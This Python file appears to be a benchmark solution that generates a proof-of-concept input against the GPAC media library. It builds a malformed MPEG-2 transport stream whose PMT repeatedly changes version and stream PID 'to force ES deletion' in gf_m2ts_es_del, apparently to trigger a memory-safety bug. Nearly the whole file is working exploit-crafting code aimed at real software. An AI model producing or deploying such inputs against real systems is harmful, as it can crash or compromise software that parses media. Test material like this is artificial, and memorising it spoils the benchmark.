import os
import tarfile
from typing import List, Tuple

def _mpeg2_crc32_table():
    poly = 0x04C11DB7
    table = []
    for i in range(256):
        c = i << 24
        for _ in range(8):
            if c & 0x80000000:
                c = ((c << 1) & 0xFFFFFFFF) ^ poly
            else:
                c = (c << 1) & 0xFFFFFFFF
        table.append(c)
    return table

_CRC_TABLE = _mpeg2_crc32_table()

def mpeg2_crc32(data: bytes) -> int:
    crc = 0xFFFFFFFF
    for b in data:
        crc = ((crc << 8) & 0xFFFFFFFF) ^ _CRC_TABLE[((crc >> 24) ^ b) & 0xFF]
    return crc & 0xFFFFFFFF

def _psi_section_header(table_id: int, section_length: int) -> bytes:
    b1 = 0xB0 | ((section_length >> 8) & 0x0F)
    b2 = section_length & 0xFF
    return bytes([table_id, b1, b2])

def _pid_bytes(pid: int) -> bytes:
    return bytes([0xE0 | ((pid >> 8) & 0x1F), pid & 0xFF])

def build_pat_section(ts_id: int, program_number: int, pmt_pid: int, version: int = 0) -> bytes:
    programs = bytes([
        (program_number >> 8) & 0xFF, program_number & 0xFF,
        0xE0 | ((pmt_pid >> 8) & 0x1F), pmt_pid & 0xFF
    ])
    section_length = 5 + len(programs) + 4
    sec = bytearray()
    sec += _psi_section_header(0x00, section_length)
    sec += bytes([(ts_id >> 8) & 0xFF, ts_id & 0xFF])
    sec += bytes([0xC0 | ((version & 0x1F) << 1) | 0x01])
    sec += b"\x00\x00"
    sec += programs
    crc = mpeg2_crc32(sec)
    sec += crc.to_bytes(4, "big")
    return bytes(sec)

def build_pmt_section(program_number: int, pcr_pid: int, streams: List[Tuple[int, int]], version: int = 0, pmt_pid: int = 0x1000) -> bytes:
    es_loop = bytearray()
    for stream_type, elem_pid in streams:
        es_loop += bytes([stream_type & 0xFF])
        es_loop += _pid_bytes(elem_pid)
        es_loop += b"\xF0\x00"
    section_length = 9 + len(es_loop) + 4
    sec = bytearray()
    sec += _psi_section_header(0x02, section_length)
    sec += bytes([(program_number >> 8) & 0xFF, program_number & 0xFF])
    sec += bytes([0xC0 | ((version & 0x1F) << 1) | 0x01])
    sec += b"\x00\x00"
    sec += _pid_bytes(pcr_pid)
    sec += b"\xF0\x00"
    sec += es_loop
    crc = mpeg2_crc32(sec)
    sec += crc.to_bytes(4, "big")
    return bytes(sec)

def build_ts_packet(pid: int, payload: bytes, pusi: bool, cc: int, payload_only: bool = True) -> bytes:
    if payload_only:
        afc = 1
        header = bytearray(4)
        header[0] = 0x47
        header[1] = ((1 if pusi else 0) << 6) | ((pid >> 8) & 0x1F)
        header[2] = pid & 0xFF
        header[3] = (afc << 4) | (cc & 0x0F)
        max_payload = 184
        if len(payload) > max_payload:
            payload = payload[:max_payload]
        pad_len = max_payload - len(payload)
        return bytes(header) + payload + (b"\xFF" * pad_len)
    else:
        afc = 3
        header = bytearray(4)
        header[0] = 0x47
        header[1] = ((1 if pusi else 0) << 6) | ((pid >> 8) & 0x1F)
        header[2] = pid & 0xFF
        header[3] = (afc << 4) | (cc & 0x0F)
        max_payload = 183
        if len(payload) > max_payload:
            payload = payload[:max_payload]
        # Put a minimal adaptation field (length=0) then payload
        pad_len = max_payload - len(payload)
        return bytes(header) + b"\x00" + payload + (b"\xFF" * pad_len)

def build_null_packet(cc: int = 0) -> bytes:
    pid = 0x1FFF
    header = bytearray(4)
    header[0] = 0x47
    header[1] = ((pid >> 8) & 0x1F)
    header[2] = pid & 0xFF
    header[3] = (1 << 4) | (cc & 0x0F)
    return bytes(header) + (b"\xFF" * 184)

def build_pes_payload(stream_id: int = 0xE0, payload_data_len: int = 160) -> bytes:
    # Minimal PES header with no PTS/DTS.
    pes = bytearray()
    pes += b"\x00\x00\x01"
    pes += bytes([stream_id & 0xFF])
    pes += b"\x00\x00"
    pes += b"\x80\x00\x00"
    if payload_data_len < 0:
        payload_data_len = 0
    pes += b"\x00" * payload_data_len
    return bytes(pes)

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Optional: try to locate the relevant source function (not required for generation).
        try:
            if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        n = m.name
                        if not (n.endswith(".c") or n.endswith(".h") or n.endswith(".cc") or n.endswith(".cpp")):
                            continue
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        data = f.read()
                        if b"gf_m2ts_es_del" in data:
                            break
        except Exception:
            pass

        ts_id = 1
        program_number = 1
        pmt_pid = 0x1000

        pat = build_pat_section(ts_id=ts_id, program_number=program_number, pmt_pid=pmt_pid, version=0)

        # Stream types chosen as common PES (H.264/AVC) with changing PID to force ES deletion.
        pid_a = 0x0100
        pid_b = 0x0101

        pmt_v0 = build_pmt_section(program_number=program_number, pcr_pid=pid_a, streams=[(0x1B, pid_a)], version=0, pmt_pid=pmt_pid)
        pmt_v1 = build_pmt_section(program_number=program_number, pcr_pid=pid_b, streams=[(0x1B, pid_b)], version=1, pmt_pid=pmt_pid)
        pmt_v2 = build_pmt_section(program_number=program_number, pcr_pid=pid_a, streams=[(0x1B, pid_a)], version=2, pmt_pid=pmt_pid)

        pkt1 = build_ts_packet(0x0000, b"\x00" + pat, pusi=True, cc=0)
        pkt2 = build_ts_packet(pmt_pid, b"\x00" + pmt_v0, pusi=True, cc=0)

        pes_a = build_pes_payload(stream_id=0xE0, payload_data_len=160)
        pkt3 = build_ts_packet(pid_a, pes_a, pusi=True, cc=0)

        pkt4 = build_ts_packet(pmt_pid, b"\x00" + pmt_v1, pusi=True, cc=1)

        pes_b = build_pes_payload(stream_id=0xE0, payload_data_len=160)
        pkt5 = build_ts_packet(pid_b, pes_b, pusi=True, cc=0)

        pkt6 = build_ts_packet(pmt_pid, b"\x00" + pmt_v2, pusi=True, cc=2)

        return pkt1 + pkt2 + pkt3 + pkt4 + pkt5 + pkt6